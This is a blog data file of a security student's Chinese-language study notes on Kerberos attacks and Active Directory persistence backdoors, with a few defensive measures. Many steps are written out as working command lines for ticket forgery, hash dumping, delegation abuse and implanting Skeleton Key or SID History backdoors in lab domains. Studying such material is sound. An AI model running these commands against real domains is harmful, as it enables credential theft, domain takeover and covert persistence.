{"meta":{"title":"Blogs for JiangA23187","subtitle":"","description":"","author":"JiangA23187","url":"http://example.com","root":"/"},"pages":[{"title":"所有分类","date":"2022-10-09T13:27:21.548Z","updated":"2022-10-09T13:27:21.548Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2022-10-09T07:43:00.000Z","updated":"2022-10-09T07:43:00.285Z","comments":true,"path":"archives/index.html","permalink":"http://example.com/archives/index.html","excerpt":"","text":""},{"title":"","date":"2022-11-21T06:41:55.916Z","updated":"2022-11-21T06:41:55.916Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"某大学网络空间安全大三在读菜鸡，正在努力学习丰富自己的技术栈，希望大佬们能够多多与我交流！！！"},{"title":"所有标签","date":"2022-10-09T13:27:38.762Z","updated":"2022-10-09T13:27:38.762Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2022-10-09T07:50:17.188Z","updated":"2022-10-09T07:50:17.188Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"}],"posts":[{"title":"Kerberos及相关漏洞","slug":"Kerberos认证基础","date":"2023-03-14T11:58:47.303Z","updated":"2023-03-14T12:00:04.182Z","comments":true,"path":"2023/03/14/Kerberos认证基础/","link":"","permalink":"http://example.com/2023/03/14/Kerberos%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80/","excerpt":"","text":"Kerberos认证协议是基于票据的一种认证方式，可以分为三部分：用户(client)，服务器(server)和KDC(Key Distribution Center ,密钥分发中心)。其中KDC包含AS(Authentication Server, 认证服务器)和TGS(Ticket Granting Server, 票据授权服务器) 密钥分发中心KDC 是 Kerberos 的核心组件，默认安装在域控里，由两个服务组成：AS，负责用户信息认证，给客户端提供TGT；TGS，向客户端提供ST和Session Key(服务会话密钥) Kerberos基础认证流程流程图： 6个阶段的解释如下： AS-REQ：Client向KDC(AS)发起一个认证请求，请求的凭据是Client的NTLM Hash加密的时间戳以及身份信息等 AS-REP：AS使用Client NTLM HASH进行解密，若检验正确则返回用KRBTGT HASH加密的TGT票据(再TGS-REQ中发送到TGS并用于换取ST)，TGT里面包含PAC TGS-REQ：Client获得TGT缓存在本地(不能解密)，可用来向TGS换取访问相应服务的ST票据 TGS-REP：TGS使用KRBTGT HASH解密TGT，若结果正确，返回用提供服务的服务器的Server Hash(机器用户HASH)加密的ST(server ticket) AP_REQ：Client拿着获得的ST去服务器请求资源 AP_REP：Server使用自己的Hash解密ST，若解密正确，则拿着获取的PAC去访问KDC判断Client是否有权限访问。KDC解密PAC后获取用户sid以及所在组的信息，并根据访问控制表（ACL）判断权限。若符合，Server返回资源给Client 时序图： 攻击分类： AS_REQ&amp;AS_REP阶段 正常域用户登录主机时，可以通过 net user /domain来列举出域内的用户。但是当我们用非域用户进行登录时，是不能使用 net user /domain这条命令的。 Kerberos本身是一种基于身份认证的协议，在 Kerberos 协议认证的 第一阶段AS-REQ ，当用户不存在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP的返回包不一样。所以可以利用这点，对域内进行域用户枚举和密码喷洒攻击。 在AS-REQ阶段客户端向AS发送用户名，AS对用户名进行验证，用户存在和不存在返回的数据包不一样 三种状态的错误代码分别为： KRB5DC_ERR_PREAUTH_REQUIRED 需要额外的预认证（用户存在） KRB5DC_ERR_CLIENT_REVOKED 客户端凭证已被吊销（禁用 ） KRB5DC_ERR_C_PRINCIPAL_UNKNOWN 在Kerberos数据库中找不到客户端（不存在） 域内用户枚举原理： 在AS-REQ阶段客户端向AS发送用户名，AS对用户名进行验证， 当发送的用户存在，返回KRB5DC_ERR_PREAUTH_REQUIRED并携带e-data数据 当发送的用户不存在，返回“KRB5DC_ERR_C_PRINCIPAL_UNKNOWN”，同时不携带”e-data”数据 使用： 使用kerbrute工具进行枚举 12kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txtkerbrute_windows_amd64.exe userenum --dc 192.168.3.21 -d god.org top500.txt 密码喷射攻击密码喷洒就是先用一个密码去碰撞很多账号，此方法能有效的避免账号被锁定的问题 原理： 在确认用户存在后，客户端又会发送一个AS-REQ请求，如果密码正确，则返回AS-REP。否则返回 KRB5KDC_ERP_PREAUTH_FAILED 使用： 1.kerbrute 将刚刚枚举到的用户储存至user.txt，利用kerbrute进行密码喷射 12kerbrute_windows_amd64.exe passwordspray --dc 域控ip -d 域名 users.txt 密码kerbrute_windows_amd64.exe passwordspray --dc 192.168.3.21 -d god.org user.txt Admin@123 2.pykerbrute(kerbrute的python版本)，能支持hash传递 12345针对明文进行喷洒python2 ADPwdSpray.py 192.168.3.21 admin.org user.txt clearpassword 密码 tcp 针对哈希进行喷洒python2 ADPwdSpray.py 192.168.3.21 admin.org user.txt ntlmhash afffeba176210fad4628f0524bfe1942 udp AS-REP Roasting前提： 域用户设置了 Do not require Kerberos preauthentication(不需要kerberos预身份验证) 在AS-REP过程中就可以任意伪造用户名请求票据，随后AS会将伪造请求的用户名NTLM Hash加密后返回，就可以对加密后的NTLM Hash进爆破 利用： 1.powerview查找域中设置了 “不需要kerberos预身份验证” 的用户 12Import-Module .\\powerview.ps1Get-DomainUser -PreauthNotRequired 2.使用ASREPRoast.ps1获取AS-REP返回的Hash 12Import-Module .\\ASREPRoast.ps1Get-ASREPHash -UserName jiang -Domain god.org | Out-File -Encoding ASCII hash.txt 执行后对应目录下生成了hash.txt文件 3.使用hashcat对获得的Hash进行爆破 将hash.txt复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接。然后使用以下命令爆破 1hashcat.exe -m 18200 hash.txt pass.txt --force ps.运行hashcat时可能出现报错 从官网下载最新版本的OpenCL即可 黄金票据在Kerberos中，用户票据由krbtgt的NTLM哈希值加密生成的，如果获取了krbtgt的哈希值，就可以伪造任意用户的票据 前提：知道域名、域SID、krbtgt NTLM哈希值，伪造用户 利用方法： 1.导出krbtgt用户的hash值 1mimikatz log &quot;lsadump::dcsync /domain:god.org /user:krbtgt&quot; 需要以下三个信息 2.生成黄金票据 1kerberos::golden /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /aes256:5a75bb9a4fc4453c66621a54af111884f45bbca6365bf4d81bc059f31e708827 /user:god /ticket:gold.kirbi 在mimikatz目录下生成了gold.kribi票据 3.导入票据mimikatz执行kerberos::ptt ./gold.kirbi,成功生成票据 或者利用以下命令直接生成票据并注入内存 1kerberos::golden /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /aes256:5a75bb9a4fc4453c66621a54af111884f45bbca6365bf4d81bc059f31e708827 /user:god /ptt 生成票据后，就获取了域控权限 4.清除票据：cmd执行klist purge TGS_REQ&amp;TGS_REP阶段白银票据通过伪造ST访问服务，但只能访问特定服务器的特定服务 前提：知道域名、域SID、krbtgt NTLM哈希值、可利用服务、服务账号的NTML HASH、伪造用户 利用方法： 1.在DC上以管理员权限执行以下命令获取信息 1mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; 2.在低权限账号执行以下命令获取对应服务权限 ①清空票据klist purge ②执行以下命令 1kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:服务名 /rc4:服务账号NTML HASH /user:用户名 /ptt 完整域控名：Username字段+域名，此处为OWA2010CN-GOD.god.org 域sid：whoami /all取红框内部分 服务类型选择如下图： ③根据获取的服务权限进行下一步操作 如执行以下命令获取了ldap权限 1kerberos::golden /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:OWA2010CN-GOD.god.org /service:ldap /rc4:03732d568bcc44e3a6804f94a5d07545 /user:aa /ptt 就可以利用DCSync获取krbtgt的hash从而制作黄金票据 获取cifs权限： KerberoastSPN（服务器主体名称）是服务器运行服务的唯一标识，每个由kerberos认证的服务都必须正确配置SPN。SPN有两种注册方式：机器账户computer，域内用户users。KDC查询SPN也按照账户方式查找。 在TGS_REP阶段使用服务的NTLM Hash返回的加密数据，对于域内任何主机，都可以通过查询SPN从而向所有服务请求ST。 由于机器账户的SPN每30天会更改随机128个字符密码导致无法破解，实际过程中主要攻击域用户。如果SPN没有注册在域用户下，就可以尝试注册再利用hashcat进行破解。 SPN注册 主机：win7.god.org 域控：OWA2010CN-GOD.god.org 当前用户：god\\administrator 注册SPN需要域管理员权限，普通域成员注册会提示权限不够！ 以用户身份进行SPN注册 123setspn -S SQLServer/OWA2010CN-GOD.god.org:1433 god\\webadmin或setspn -U -A SQLServer/OWA2010CN-GOD.god.org:1433 god\\administrator 以主机身份进行SPN注册 1setspn -S SQLServer/OWA2010CN-GOD.god.org:1533/MSSQL OWA2010CN-GOD #OWA2010CN-GOD必须是当前的主机名 SPN发现使用SetSpn 12345查看当前域内所有的SPN：setspn -Q */*查看指定域god.org注册的SPN：setspn -T god.org -Q */* 如果指定域不存在，则默认切换到查找本域的SPN查找本域内重复的SPN：setspn -X删除指定SPN：setspn -D SQLServer/OWA2010CN-GOD.god.org:1533/MSSQL OWA2010CN-GOD查找指定用户/主机名注册的SPN：setspn -L username/hostname Powelshell 使用empire框架下的Invoke-kerberoast.ps1 12Import-Module .\\Invoke-kerberoast.ps1Invoke-kerberoast -OutputFormat Hashcat 攻击流程：导出票据Rebeus 1Rubeus.exe kerberoast /format:hashcat /outfile:hash.txt hashcat爆破 1hashcat -m 13100 hash.txt pass.txt(密码字典) --force mimikatz 12345678#请求服务票据kerberos::ask /target:SQLServer/OWA2010CN-GOD.god.org:1433#列出服务票据kerberos::list #清除所有票据kerberos::purge#导出所有票据mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot; 导出后会在同一目录生成kirbi文件 MSF 12load kiwikerberos_ticket_list 破解票据1.使用 tgsrepcrack.py 1tgsrepcrack.py 字典.txt xx.kirbi 票据重写&amp;RAM注入：使用Kerberoast python脚本重写票据。使得在服务将被访问时模拟任何域用户或伪造账户。此外，提权也是可能的，因为用户可以被添加到诸如域管理员的高权限组中。 12python kerberoast.py -p [得到的密码] -r [已有的凭据.kirbi] -w [新凭据的名字.kirbi] -u 500 python kerberoast.py -p [得到的密码] -r [已有的凭据.kirbi] -w [新凭据的名字.kirbi] -g 512 使用以下Mimikatz命令将新票据重新注入内存，以便通过Kerberos协议对目标服务执行身份验证。 1kerberos::ptt PENTESTLAB.kirbi 委派攻击原理在现实网络环境中，多个服务往往分属于多个机器中，如果用户使用服务A时需要服务B上属于自己的数据，A就代用户去请求B返回响应数据，该过程叫做委派。 委派攻击分为非约束委派、约束委派、基于资源的约束委派（RBCD），非约束委派是指用户账户将自身的TGT转发给服务账户使用。约束委派通过S4U2Self和S4U2Proxy两个扩展协议限制服务账户只能访问指定服务资源。RBCD主要就是委派的管理移交给服务资源进行控制，其余和约束性委派基本相同。 1.非约束委派攻击自Windows2000开始，微软添加了委派功能。域委派是一种应用模式，指的是将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。简单来介绍就是用户A访问服务B，但是访问过程中需要访问服务C，于是B就使用A提供的TGT委派访问C。 非约束性委派(Unconstrained Delegation)：服务账号可以请求得到域内用户的TGT，服务账号使用该TGT模拟域内用户访问任意服务。被配置为非约束委托的系统将把TGT（Ticket Granting Ticket）存储到LSASS内存中，以便使用户能够访问终端资源。 当攻击者攻击了某个开启了非约束委派的服务后，诱使域管理员访问，那么该服务所在计算机会将域管理员的TGT保存至内存，攻击者就可以借此获取域控权限。 注意：域控机器账户默认配置非约束性委派 设置允许委派: 注册非约束性委派账户 1setspn -U -A priv/test webadmin 探测方法使用ADFind工具 1234# ADFind查询非约束委派普通账户AdFind.exe -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn# ADFind查询非约束委派机器账户AdFind.exe -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn PowerView 12Import-Module ./PowerView.ps1Get-NetComputer –unconstrained | select dnshostname, samaccountname 攻击方法1.构造服务账户票据利用条件： 服务账户设置了非约束性委派 已知服务账户的密码口令信息（webadmin:admin!@#45） 利用kekeo工具进行伪造票据 123456#伪造TGTkekeo.exe &quot;tgt::ask /user:webadmin /domain:god.org /password:admin!@#45 /ticket:administrator.kirbi&quot; &quot;exit&quot;#申请CIFS服务kekeo.exe &quot;Tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:administrator@god.org /service:cifs /OWA2010CN-GOD.god.org&quot; &quot;exit&quot;# 使用mimikatz将该票据注入当前的会话中mimikatz.exe &quot;kerberos::ptt TGS_administrator@god.org@GOD.ORG_webadmin@GOD.ORG.kirbi&quot; &quot;exit&quot; 利用rubeus工具 12345#伪造TGTRubeus.exe asktgt /user:webadmin /domain:god.org /password:admin!@#45#申请访问CIFS服务Rubeus.exe s4u /ticket:base64-tgt /impersonateuser:administrator /msdsspn:cifs/OWA2010CN-GOD.god.org /ptt 2.诱使域管理员访问机器当域管理员使用net use等远程访问命令，模拟域控管理员访问WIN7主机，设置了非约束性委派的主机可以抓取到域控管理员的TGT。 利用条件： 需要Administrator权限 域内主机的机器账户开启非约束委派 域控管理员远程访问 假设域控管理员执行： 12# 域控用户访问域内主机net use \\\\webserver 导出票据，执行攻击 12# 域内主机导出票据mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot; 导出票据对应各个服务,找到administrator对应的票据 12345# 清空票据，可以使用绝对路径kerberos::purge [ticket]#当同时存在多个票据时，会随机选择一个票据进行认证，因此在使用目标票据前，需要清除原有票据# 导入内存mimikatz.exe &quot;kerberos::ptt piao&#x27;ju&quot; &quot;exit&quot; 123# 访问目标盘misc::cmddir \\\\OWA2010CN-GOD\\c$ 3.结合打印机漏洞利用条件：administrator权限 域控上查询打印服务是否开启 1sc query spooler 使用Rubeus监听来自域控的票据 1Rubeus.exe monitor /interval:2 /filteruser:OWA2010CN-GOD$ 强制回连，获得域控机器账户的TGT 1234#spoolsample.exe 域控 目标主机（需要win7以上版本并安装.net4.0）hostname查看主机名spoolsample.exe OWA2010CN-God mary-PC 这里域环境有点问题，一运行spoolsample.exe就弹窗 ，用下在其他域环境复现的图 获得的票据格式有点小问题，去除下行尾空格保存为kirbi格式 利用rebeus或者mimikatz导入 1234#mimikatzkerberos::ptt 票据#rebeusrebeus.exe /ticket:票据 2.约束委派原理由于非约束委派的不安全性，同时顺利进行约束委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议S4u2self（Service for User to Self）和S4U2proxy（Service for User to Proxy）。 约束委派有两种 仅使用Kerberos，不能进行协议转换 使用任何身份验证协议 S4u2self &amp; S4U2proxy S4U2self协议允许服务代表任意用户请求访问自身服务的ST服务票据,必须在有SPN的账户上操作 S4U2proxy协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据 约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务。而且在请求过程中使用ST,权限要比TGT小 配置了约束性委派的账户属性会有如下两个变化： 账户userAccountControl属性会被设置为TRUSTED_TO_AUTH_FOR_DELEGATION标志位，值为16781312 账户的msDS-AllowedToDelegateTo属性，添加允许委派的服务 约束性委派攻击的关键就是获得可转发的服务票据ST 探测方法AdFind 12345# AdFind.exe查询约束委派机器账户AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto# AdFind.exe查询约束委派服务账户AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto PowerView 12345678#Set-ExecutionPolicy RemoteSigned -Scope CurrentUser 解决禁止执行脚本问题# 导入Import-Module ./PowerView.ps1# PowerView查询约束委派机器账户Get-DomainComputer -TrustedToAuth -domain redteam.red -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize# PowerView查询约束委派服务账户Get-DomainUser –TrustedToAuth -domain redteam.red -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl 攻击方法1.使用机器账户的票据 | kekeo 获取根据约束性委派的执行过程可知，只要控制配置约束性委派服务的机器，并获得了它的密码，那么我们就可以劫持这台主机的kerberos请求过程，最终获得任意用户权限的ticket 利用条件： 需要Administrator权限 目标机器账户配置了约束性委派 利用mimikatz导出lasass.exe中的所有票据(管理员权限)，选择所需票据 1mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot; 使用kekeo工具申请服务票据（S4U2Proxy协议） 12# 申请服务票据kekeo.exe &quot;tgs::s4u /tgt:[0;3e4]-2-0-60a00000-SQLSERVER-2008$@krbtgt-REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot; &quot;exit&quot; 使用mimikatz注入票据 1kerberos::ptt 票据 2.使用用户hash值利用条件： 需要Administrator权限 目标机器账户配置了约束性委派 Rebues 使用mimikatz获取NTLM Hash值 123# 使用mimikatz获取机器账户NTLM Hash(Administrator权限)mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;#ef1143ba8219028beed45f17770441fa 使用Rubeus申请访问自身的可转发服务票据 12# 使用Rubeus申请配置了约束委派机器账户sqlserver-2008$的TGTRubeus.exe asktgt /user:sqlserver-2008$ /rc4:ef1143ba8219028beed45f17770441fa /domain:redteam.red /dc:owa.redteam.red /nowrap 将获得的票据删除行尾空格后保存为1.kirbi 12# 使用Rubeus通过S4U2Self协议代表域管理员Administrator请求针对域控LDAP服务的票据，并注入内存Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/owa.redteam.red /dc:owa.redteam.red /ptt /ticket:1.kirbi dir一下 getST getST.py脚本请求服务票据 12345678# mimikatz获取机器账户NTLM Hash值mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;# 使用getST申请服务票据python3 getST.py -dc-ip 10.10.10.8 -spn CIFS/owa.redteam.red -impersonate administrator redteam.red/sqlserver-2008$ -hashes :ef1143ba8219028beed45f17770441fa# 使用票据远程访问KRB5CCNAME=administrator.ccache python3 wmiexec.py -k redteam.red/administrator@owa.redteam.red -no-pass -dc-ip 10.10.2.20 kekeo 12345678# 请求票据kekeo.exe &quot;tgt::ask /user:sqlserver-2008$ /domain:redteam.red /NTLM:ef1143ba8219028beed45f17770441fa&quot; &quot;exit&quot;# 申请administrator权限的票据kekeo.exe &quot;tgs::s4u /tgt:TGT_sqlserver-2008$@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot; &quot;exit&quot;# mimikatzmimikatz.exe &quot;kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi&quot; &quot;exit&quot; 3.基于资源的约束性委派原理微软在Windows Server 2012 中新引入基于资源的约束性委派（Resource Based Constrained Delegation, RBCD），RBCD不需要通过具备SeEnableDelegationPrivilege权限的域管理员进行修改，而是将设置属性的权限给了服务机器本身。 配置了RBCD的账户属性有如下变化： msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户 可以将基于资源的约束性委派理解为传统的约束性委派的反向过程。以 Service 1 和 Service 2 两个服务为例，传统的约束性委派需要在 Service 1 上设置 msDS-AllowedToDelegateTo 属性，以指定对 Service 2 上的哪一个服务进行委派。而在基于资源的约束性委派中，需要在 Service 2 上将 msDS-AllowedToActOnBehalfOfOtherIdentity属性值设为 Service 1 的 SID，以允许 Service 1 对 Service 2 上的服务进行委派。 如果可以修改服务B的msDS-AllowedToActOnBehalfOfOtherIdentity属性,将其更新为可控制的SPN账户SID,就可以伪造任意账户获得服务B的相关权限,从而变相提权。 winserver2012 得重新搞个合适的域环境了 容我小摆一下,之后补上 PAC攻击1.MS14-068老经典的洞了,之前一直在用,但不太清楚原理 原理 KDC无法正确检查PAC中的有效签名,由于实现签名允许所有加密算法,因此只要客户端指定任意签名算法, KDC就会使用指定的算法进行签名验证. 导致用户可以自己构造一张PAC,伪造用户的SID和所在的组,并通过伪造的PAC加入域管相关信息,并访问域控.KDC会认为该用户有权限,从而将其当作域管组的成 利用1.goldenPac 12#python3 goldenPac.py 域名/用户名:密码@域控名python goldenPac.py god.org/mary:admin!@#45@OWA2010CN-GOD.god.org 2.kekeo 1kekeo.exe &quot;exploit::ms14068 /domain:readteam.red /user:sqlserver-2008$ /password:Server12345 /ptt&quot; &quot;exit&quot; 2.CVE-2021-42278 &amp; CVE-2021-42287原理1234567CVE-2021-42278：是一个安全绕过漏洞，允许通过修改机器账户的sAMAccountName属性来冒充域控制器。与标准用户相比，机器账户的名字以\\$结尾，但AD并没有验证域内机器账户中是否有\\$，导致机器账户可以被假冒。CVE-2021-42287：是影响Kerberos特权属性证书（PAC）的安全绕过漏洞，允许通过假冒域控制器，使密钥分发中心KDC创建高权限票据。在请求服务票据时,需要TGT,当活动目录中不存在的用户请求服务票据时,KDC将在该用户名上附加$进行搜索当账户请求一个TGT后，更名账户，然后通过S4U2self 申请TGS Ticket，接着域控在 TGS_REP 阶段，这个账户不存在的时候，DC会使用自己的密钥加密 TGS Ticket ，提供一个属于该账户的 PAC，就能获取一个高权限ST,实现权限提升 利用1.在普通域用户主机上创建一个机器账户,假设为jiang$ 123456#PowermadImport-Module .\\Powermad.ps1#设置机器账户的密码$password = ConvertTo-SecureString &#x27;password&#x27; -AsPlainText -Force#通过New-MachineAccount创建机器账户New-MachineAccount -MachineAccount &quot;jiang&quot; -Password $($Password) -Domain redteam.red -DomainController owa.redteam.red -Verbose 2.清除机器账户jiang$的SPN信息 123Import-Module .\\PowerView.ps1Set-DomainObject &quot;CN=jiang,CN=Computers,DC=redteam,DC=red&quot; -Clear &#x27;serviceprincipalname&#x27; 3.修改机器账户jiang$的sAMAccountName属性(储存域用户或机器账户的登录名),使其指向不带$的域控账户 (如:DC名称为OWA2010CN-GOD$,则将机器账户jiang$更名为OWA2010CN-GOD) 1Set-MachineAccountAttribute -MachineAccount &quot;jiang&quot; -Value &quot;owa&quot; -Attribute &quot;sAMAccountname&quot; 4.请求TGT 1Rubeus.exe asktgt /user:owa /password:&quot;password&quot; /domian:redteam.red /dc:owa.redteam.red /nowrap 5.还原初始账户属性 12#重新还原机器帐户属性后，现在就可以使用能检索到的TGT请求S4U2self票证来获得使用DC密钥加密的ST，同时还可以将票证中的sname重写为LDAP服务Set-MachineAccountAttribute -MachineAccount jiang -Value &quot;jiang&quot; -Attribute samaccountname -Verbose 6.申请票据 1Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:owa.redteam.red /self /altservice:LDAP/owa.redteam.red /ptt /ticket:(4中票据) 成功获取到Administrator的LDAP服务票据 7.使用mimikatz获取 kbrtgt 用户的 NTLM Hash 1mimikatz.exe &quot;lsadump::dcsync /domain:redteam.red /user:krbtgt&quot; exit &gt;dcsync.txt Nopac自动化攻击 前提:需要一个域普通用户 12noPac.exe -domain redteam.red -user saul -pass &#x27;Saul12345&#x27; /dc owa.redteam.red /mAccount jiang /mPassword passwird /service cifs /pttnoPac.exe -domain redteam.red -user saul -pass &#x27;Saul12345&#x27; /dc owa.redteam.red /mAccount jiang /mPassword password /service ldap /ptt","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"内网协议","slug":"内网协议","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E5%8D%8F%E8%AE%AE/"}]},{"title":"域后门技术","slug":"常见域后门技术","date":"2022-12-04T08:21:15.900Z","updated":"2022-12-04T08:21:48.213Z","comments":true,"path":"2022/12/04/常见域后门技术/","link":"","permalink":"http://example.com/2022/12/04/%E5%B8%B8%E8%A7%81%E5%9F%9F%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/","excerpt":"","text":"Skeleton Key域后门通过在域控制器上安装Skeleton Key，所有域用户账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。该技术通过注入lsass.exe进程实现，创建的Skeleton Key仅保留在内存中，如果域控重启，Skeleton Key就会失效。 需要域管理员级别权限 0x01.常规利用在域控中上传mimikatz，执行以下命令创建skeleton后门 mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit 执行后，将会为所有域账户设置一个相同的密码”mimikatz“，从而可以登录域控 0x02.防护措施微软添加了LAS（Local Security Authority）保护策略，用来防止对lsass.exe进程的内存读取和代码注入。 1234#开启LSA保护策略reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RunAsPPL /t REG_DWORD /d 1 /f#关闭LSA保护策略reg delete &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RunAsPPL 开启并重启系统后，mimikatz的相关操作都会失败，即使已经获取了Debug权限也无法获取用户hash值，也无法安装Skeleton Key 0x03绕过LSA防护 Mimikatz支持绕过LSA防护，需要mimikatz项目中的mimidrv.sys驱动文件 使用以下命令安装Skeleton Key 1234privilege::debug!+!processprotect /process:lsass.exe /removemisc::skeleton DSRM域后门0x01.密码修改目录服务恢复模式(DSRM，Directory Services Restore Mode)，是Windows服务器域控制器的安全模式启动选项。 域控制器的本地账户也就是DSRM账户，DSRM密码是在DC创建时设置的，一般很少更改。DSRM允许管理员用来修复或还原或重建活动目录数据库。如果DSRM密码忘了，可以使用命令行工具NTDSUtil进行更改。 DSRM 对域环境的持久化操作目前只能在安装KB96-1320的windows -server2008及以后版本，windows server2003 不能使用此方法。 相关步骤如下 123456789101112#打开 ntdsutil：ntdsutil#进入DSRM账户密码设置模式：set DSRM password#在当前域控上恢复DSRM密码reset password on server null#输入新密码#再次输入新密码#退出DSRM密码设置模式q#退出ntdsutilq 0x02.利用1.修改 DSRM 的登录方式 DSRM 有三种登录方式，具体如下： 0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号 1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器 2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器 在Windows Server 2000以后的版本操作系统中，对 DSRM 使用控制台登录域控制器进行了限制,如果要使用 DSRM 账号通过网络登录域控制器，需要将该值设置为 2。使用以下命令修改注册表 1reg add &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f 2.使用mimikatz抓取DSRM密码 123privilege::debugtoken::elevatelsadump::sam 3.利用获取的hash值进行攻击 在其他域成员机器上使用DSRM进行远程登陆 12mimikatz privilege::debugmimikatz sekurlsa::pth /domain:域名 /user:用户名 /ntlm: ccef208c6485269c20db2cad21734fe7 0x03.防护措施1、定期检查注册表中用于控制DSRM登录方式的键值 HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior 确认该键值为1，或者删除该键值 2、定期修改域中所有域控制器的DSRM账号 3、经常检查ID 为4794的日志。尝试设置活动目录服务还原模式的管理员密码会被记录在4794日志中 SID History SID指的是安全标识符，是用户、用户组、或其他安全主体的唯一、不可变标识符。Windows根据ACL（访问控制列表）授予或拒绝对资源的访问和特权，ACL使用SID来唯一标识用户及其组成员的身份。主要是跟踪安全主体控制用户连接资源时的访问权限。 SID History是在域迁移过程中需要使用的一个属性。 如果A域中的域用户迁移到B域中，那么该用户的SID值就会改变，进而其权限也会改变。导致迁移后的用户无法访问以前可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，如果迁移后用户的SID值改变，系统会将原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。 使用mimikatz可以将SID History属性添加到任意用户的SID History属性中。在渗透测试中，如果获得了域管理员权限（或者等同于域管理员权限），就可以将SID History作为实现持久化的方法。 0x01.利用通过powershell查看用户属性 12Import-Module ActiveDirectoryGet-ADUser username -Properties SIDHistory 将mimikatz上传至域控，并执行以下命令 1234567891011# 将高权限的 SID History 属性注入privilege::debug# 注入SID之前需要使用以下命令修复NTDS服务，否则无法将高权限的SID注人低权限用户的SID History属性;sid::patchsid::add /sam:tester /new:administrator# 查看 tester 用户的 SID History 属性Get-ADUser tester -Properties sidhistory# 清除恶意用户的 SID History 属性sid::clear /sam:username 查看用户属性，用户jiang的sidhistory和administrator的SID属性相同 我们就可以利用jiang用户连接到域控制器 使用sid::clear /sam:jiang清除SIDhistory 0x02.防护措施 经常查看域用户中SID为500的用户。 完成域迁移工作后,对有相同SID History属性的用户进行检查 定期检查ID为4765和4766的日志。 4765为将 SID Histtory属性添加到用户的日志。4766为将SID History属性添加到用户失败的日志。 AdminSDHolder域后门 AdminSDHolder是一个特殊的Active Directory容器对象，位于Domain NC的System容器下，通常用作系统中某些受保护对象的安全模板，防止这些对象受到恶意修改或滥用。 可以使用adfind来查询受保护的用户和组： 1234#受保护的组Adfind.exe -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn#受保护的用户Adfind.exe -f &quot;&amp;(objectcategory=user)(admincount=1)&quot; -dn 